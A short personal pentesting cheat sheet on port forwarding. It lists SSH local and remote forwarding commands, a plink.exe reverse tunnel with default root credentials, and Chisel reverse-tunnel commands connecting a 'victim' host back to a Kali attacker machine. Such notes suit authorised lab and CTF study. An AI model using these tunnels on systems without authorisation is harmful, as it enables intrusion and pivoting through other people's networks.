---
title: Port Forwarding
updated: 2023-12-10 08:25:55Z
created: 2023-12-10 08:14:05Z
latitude: -34.92849890
longitude: 138.60074560
altitude: 0.0000
---

# Port Forwarding

## SSH
### SSH Local Port Forwarding
Used to forward a port from the client machine to the server machine

1. Run below command on cllent:
`ssh -N -L [IP_of_Interface(optional)]:[end_port]:[victim_ip]:[victim_port] [victim_user]@[victim_ip`]

eg to access remote httpd service can be accessed via local port 9999
`ssh -N -L 0.0.0.0:9999:10.10.1.4:80 victim@10.16.1.12`


### SSH Remote Port Forwarding
Used to forward traffic coming to a port on your server to your local computer, and then it is sent to a destination
Brings a port from a machine in the internal victim's network to your attacking machine:

`ssh -N -R [your_ssh_server_interface]:[your_port]:[victim_ip]:[victim_port_you_want_to_forward] [attacker_username]@[your_ssh_server_ip]`



## PLINK.EXE

`plink.exe -l root -pw toor -R 445:127.0.0.1:445 222 10.10.16.3`

## Chisel

1.  On Kali, run a reverse server to forward local ports to remote target  
    `sudo /home/kali/Tools/Chisel/chisel_1.9.1_linux_amd64 server -port 6666 --reverse`
    
2.  On target, create a tunnel to a port  
    `\\<kali>\myshare\chisel_windows_amd64.exe client <kali>:6666 R:910:127.0.0.1:910`